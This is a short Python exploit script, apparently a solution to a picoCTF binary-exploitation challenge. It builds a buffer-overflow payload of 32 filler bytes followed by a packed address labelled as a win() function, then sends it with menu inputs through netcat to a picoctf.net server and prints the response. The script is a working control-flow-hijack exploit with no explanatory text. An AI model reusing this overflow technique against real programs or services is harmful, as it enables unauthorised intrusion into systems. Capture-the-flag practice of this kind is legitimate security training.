import subprocess
import struct

# Craft binary payload
dummy = b'A' * 32
func_addr = struct.pack('<I', 0x4011a0)  # win() address
payload = dummy + func_addr

# Create input sequence
input_data = b"2\n" + payload + b"\n4\n"

# Send to remote server
proc = subprocess.Popen(
    ['nc', 'mimas.picoctf.net', '61357'],
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
    text=False  # BINARY mode!
)

stdout, stderr = proc.communicate(input=input_data, timeout=10)
print(stdout.decode('utf-8', errors='ignore'))
